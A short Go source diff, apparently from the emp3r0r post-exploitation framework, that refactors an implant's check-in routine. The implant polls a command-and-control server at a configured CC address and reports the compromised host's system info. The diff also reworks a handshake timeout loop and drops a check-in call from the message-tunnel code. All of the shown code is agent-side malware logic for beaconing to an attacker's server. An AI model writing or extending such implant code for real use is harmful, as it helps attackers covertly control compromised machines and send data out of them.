@@ -23,8 +23,7 @@ import (
 )
 
 // CheckIn poll CC server and report its system info
-func CheckIn() (err error) {
-	info := CollectSystemInfo()
+func CheckIn(info *def.Emp3r0rAgent) (err error) {
 	checkin_URL := def.CCAddress + transport.CheckInAPI + "/" + uuid.NewString()
 	log.Printf("Collected system info, now checking in (%s)", checkin_URL)
 
@@ -153,7 +152,7 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 			HandShakesMutex.Unlock()
 		}()
 		// wait until timeout or success
-		for i := 0; i < common.RuntimeConfig.CCTimeout; i++ {
+		for range common.RuntimeConfig.CCTimeout {
 			// if hello marked as success, return true
 			HandShakesMutex.RLock()
 			isSuccess := HandShakes[hello_id]
@@ -204,7 +203,6 @@ func CCMsgTun(callback func(*def.MsgTunData), ctx context.Context, cancel contex
 			log.Print("sendHello failed")
 			break
 		}
-		err = CheckIn()
 		if err != nil {
 			log.Printf("Updating agent sysinfo: %v", err)
 		}
